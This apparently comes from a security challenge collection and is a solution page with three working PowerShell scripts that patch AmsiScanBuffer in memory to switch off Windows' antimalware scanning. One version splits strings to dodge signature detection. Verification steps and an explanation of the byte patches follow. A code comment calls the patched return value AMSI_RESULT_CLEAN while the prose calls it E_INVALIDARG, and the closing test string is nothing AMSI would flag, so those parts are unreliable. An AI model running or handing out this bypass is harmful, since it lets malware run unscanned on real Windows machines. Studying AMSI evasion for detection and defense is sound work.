---
title: "Solution 32: AMSI Memory Patch (AmsiScanBuffer Overwrite)"
challenge_number: 32
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/32-amsi-memory-patch/
---

# Solution: AMSI Memory Patch (AmsiScanBuffer Overwrite)

[Back to Challenge](../challenges/32-amsi-memory-patch.md)

## Overview

Overwrite the first bytes of `AmsiScanBuffer` in `amsi.dll` with a stub that immediately returns `AMSI_RESULT_CLEAN`. Since `amsi.dll` is loaded into user-space process memory, the current process has full write access to its code pages (after changing memory protection).

## Working Code

### Method 1: Return AMSI_RESULT_CLEAN (6-byte patch)

```powershell
# P/Invoke definitions for Win32 API calls
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

# 1. Get the address of AmsiScanBuffer in amsi.dll
$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")

# 2. Change memory protection to PAGE_EXECUTE_READWRITE (0x40)
$oldProtect = 0
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]6, 0x40, [ref]$oldProtect)

# 3. Write the patch: mov eax, 0x80070057; ret
#    0xB8 = mov eax, imm32
#    0x57000780 = AMSI_RESULT_CLEAN (little-endian of 0x80070057)
#    0xC3 = ret
$patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)

# 4. Restore original protection (optional but cleaner)
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]6, $oldProtect, [ref]$oldProtect)
```

### Method 2: Return S_OK with no detection (3-byte patch)

```powershell
# Same setup as above (Add-Type, LoadLibrary, GetProcAddress)...

# Simpler 3-byte patch: xor eax, eax; ret
# eax = 0 means S_OK (HRESULT success), and the result buffer isn't written
# so AMSI interprets 0 as no detection
$patch = [byte[]](0x31, 0xC0, 0xC3)  # xor eax,eax; ret

$oldProtect = 0
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]3, 0x40, [ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]3, $oldProtect, [ref]$oldProtect)
```

### Method 3: Compact One-Script Version

```powershell
$a = [System.Runtime.InteropServices.Marshal]
$b = 'Am'+'si'+'Sc'+'an'+'Bu'+'ff'+'er'  # Avoid static signature
$k32 = $a::GetHINSTANCE([Object].Module).ToInt64()  # Not used directly

# Get amsi.dll base and function address
Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
' -Name 'K32' -Namespace 'W'

$dll = [W.K32]::LoadLibrary("am"+"si.dll")
$addr = [W.K32]::GetProcAddress($dll, $b)
$p = 0
[W.K32]::VirtualProtect($addr, [UIntPtr]3, 0x40, [ref]$p)
$a::Copy([byte[]](0x31,0xC0,0xC3), 0, $addr, 3)
[W.K32]::VirtualProtect($addr, [UIntPtr]3, $p, [ref]$p)

Write-Host "AMSI patched."
```

## Why It Works

### Memory Layout

When PowerShell loads, `amsi.dll` is mapped into the process's virtual address space:

```
Process Memory Map:
┌──────────────────────────────┐
│  powershell.exe (.text)      │  Read/Execute
├──────────────────────────────┤
│  amsi.dll (.text)            │  Read/Execute  ← AmsiScanBuffer lives here
├──────────────────────────────┤
│  ntdll.dll                   │
├──────────────────────────────┤
│  Heap / Stack                │
└──────────────────────────────┘
```

Key facts:
1. **User-space memory is fully accessible** to the owning process. There is no kernel protection on DLL code pages — only page-level permissions (R/X).
2. **VirtualProtect** changes page permissions. Changing from `PAGE_EXECUTE_READ` to `PAGE_EXECUTE_READWRITE` allows writing to code pages.
3. **The patch overwrites the function prologue**. When AMSI calls `AmsiScanBuffer`, it immediately hits our `ret` instruction and returns without executing any scanning logic.

### The 6-Byte Patch Explained

```asm
; Original AmsiScanBuffer prologue:
; mov edi, edi    (or sub rsp, ...)
; push ebp
; mov ebp, esp
; ...

; After patch:
mov eax, 0x80070057   ; B8 57 00 07 80 - return E_INVALIDARG
ret                    ; C3             - return to caller immediately
```

The return value `0x80070057` is `E_INVALIDARG`. PowerShell interprets any error HRESULT from AMSI as "scan unavailable" and proceeds without blocking.

### The 3-Byte Patch Explained

```asm
xor eax, eax    ; 31 C0 - eax = 0 (S_OK)
ret              ; C3    - return to caller
```

Returning `S_OK` (0) with the result parameter unmodified means "scan succeeded, nothing found."

### Why This Persists for the Session

The patch modifies the in-memory copy of `amsi.dll` for this process only. Every subsequent call to `AmsiScanBuffer` hits the patched bytes. The on-disk DLL is unchanged, and other processes are unaffected (each has its own memory mapping).

## How to Verify

1. Open a fresh PowerShell session:
   ```powershell
   powershell.exe -NoProfile
   ```

2. Before patching, verify AmsiScanBuffer is intact:
   ```powershell
   Add-Type -MemberDefinition '
   [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
   [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
   ' -Name 'K' -Namespace 'W'

   $dll = [W.K]::LoadLibrary("amsi.dll")
   $addr = [W.K]::GetProcAddress($dll, "AmsiScanBuffer")
   $original = [byte[]]::new(6)
   [System.Runtime.InteropServices.Marshal]::Copy($addr, $original, 0, 6)
   Write-Host "Before: $($original | ForEach-Object { '0x{0:X2}' -f $_ })"
   ```

3. Apply the patch (use Method 1 or 2 from above).

4. Read the bytes again to confirm they changed:
   ```powershell
   $patched = [byte[]]::new(6)
   [System.Runtime.InteropServices.Marshal]::Copy($addr, $patched, 0, 6)
   Write-Host "After: $($patched | ForEach-Object { '0x{0:X2}' -f $_ })"
   # Should show: 0xB8 0x57 0x00 0x07 0x80 0xC3  (or 0x31 0xC0 0xC3 for 3-byte)
   ```

5. Test with a known-bad string:
   ```powershell
   Invoke-Expression 'Write-Host "AMSI patched - malware test"'
   ```
   If it executes without being blocked, the patch is working.
